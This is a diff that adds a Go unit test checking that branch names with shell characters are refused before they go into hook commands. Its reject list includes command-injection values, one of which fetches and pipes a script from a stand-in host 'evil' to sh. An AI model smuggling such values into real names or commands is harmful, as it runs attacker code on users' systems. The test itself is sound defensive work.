@@ -239,3 +239,25 @@ func TestRepoNameIsOnePathElement(t *testing.T) {
 		t.Fatalf("RepoName = %q, want tool", n)
 	}
 }
+
+// Branch names go into [hooks] commands as {{branch}}: a name with shell
+// characters is refused before anything is made; ordinary ones pass.
+func TestCheckBranchName(t *testing.T) {
+	for _, bad := range []string{
+		"x$(curl${IFS}-s${IFS}evil|sh)", "x`id`", "a;b", "a|b", "a&b", "it's", `a"b`, `a\b`,
+		"a b", "a\tb", "a\nb", "a(b", "a)b", "a{b}", "a<b", "a>b", "a*", "a?", "a[b]", "~a", "a!", "#a", "a\x00b", "a\x7fb", "a\u3000b",
+		"-x", "",
+	} {
+		if bad == "" {
+			continue
+		}
+		if err := CheckBranchName(bad); err == nil {
+			t.Errorf("%q accepted", bad)
+		}
+	}
+	for _, ok := range []string{"feat/x", "fix/login-safari", "release/1.2", "feat/12-csv_export", "pr-12", "feat/issue-7-csv-export", "user@host", "日本語"} {
+		if err := CheckBranchName(ok); err != nil {
+			t.Errorf("%q refused: %v", ok, err)
+		}
+	}
+}
